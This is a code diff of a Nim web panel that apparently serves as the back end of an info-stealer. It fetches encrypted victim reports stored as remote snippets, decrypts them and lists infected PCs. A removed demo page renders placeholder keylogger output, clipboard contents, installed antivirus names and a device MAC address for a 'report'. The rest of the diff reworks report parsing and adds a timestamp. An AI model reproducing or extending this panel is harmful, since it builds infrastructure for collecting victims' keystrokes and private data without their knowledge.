@@ -7,43 +7,13 @@ from random import randomize
 
 from strutils import parseInt
 
-import lib/components/index as index
-import lib/components/clipboard as clipboard
-import lib/components/header as header
-import lib/components/pcname as pcname
-import lib/components/infoCard as infoCard
-import lib/components/av as av
-import lib/components/keylog as keylog
-import lib/components/devicemac as devicemac
-import lib/components/displayPcs as displayPcs
-import lib/components/searchSnippets as searchSnippets
+import lib/components/displayPcs
+import lib/components/searchSnippets
+import lib/components/timeSent
 
 randomize()
 
 var headers {.threadvar.}: Table[string, string]
-
-proc buildPage(id: string): string =
-  result = index.render(
-    pcname.render("Report #" & id & " - DESKTOP-12345") &
-    #header.render("basic info") &
-    infoCard.render(
-      "Report Identification", [
-        "Date created: 0000",
-        "Date sent: 0000",
-        "Client user name: abiregele",
-        "samd: sal1",
-      ]
-    ) &
-    av.render(
-      "Norton"
-    ) &
-    av.render(
-      "Windows Defender"
-    ) &
-    clipboard.render("nimic") &
-    keylog.render("A B C D E F G H I J K L M N O P Q R T S T U V W Y X Z") &
-    devicemac.render("AA:BB:CC:DD:EE:FF") # aici pt manufacturer folosesti aia oui
-  )
 
 proc getData(url: string): string =
   let client: HttpClient = newHttpClient()
@@ -77,16 +47,26 @@ proc getHeader(id: string): string =
   except:
     result = ""
 
+import times
+
 proc getInstanceSnippet(header: string, id: string): string =
   try:
 
     initHeaderKey(headers[header])
 
+    let snippet: JsonNode = parseJson(getSnippet id)
+    # 2020-09-04T13:56:32Z
+    let thatDate: DateTime = parse(snippet["created"].getStr, "yyyy-MM-dd\'T\'HH:mm:ss\'Z\'")
+
+    result = $thatDate.year & "/" & $thatDate.month & "/" & $thatDate.monthday & "/" &
+      $thatDate.hour & "/" & $thatDate.minute & "/" & $thatDate.second
+
+
     let data: string = decryptData(
-      parseJson(getSnippet id)["files"].getElems()[0]["content"].getStr
+      snippet["files"].getElems()[0]["content"].getStr
     )
 
-    result = parseThreads(id, data)
+    result.add parseThreads(id, data)
   except:
     result = ""
 
@@ -98,8 +78,6 @@ routes:
     resp displayPcs.render()
   get "/header/@header":
     resp searchSnippets.render @"header"
-  get "/show/@id":
-    resp buildPage @"id"
   get "/getHeader/@id":
     echo $headers
     resp getHeader @"id"
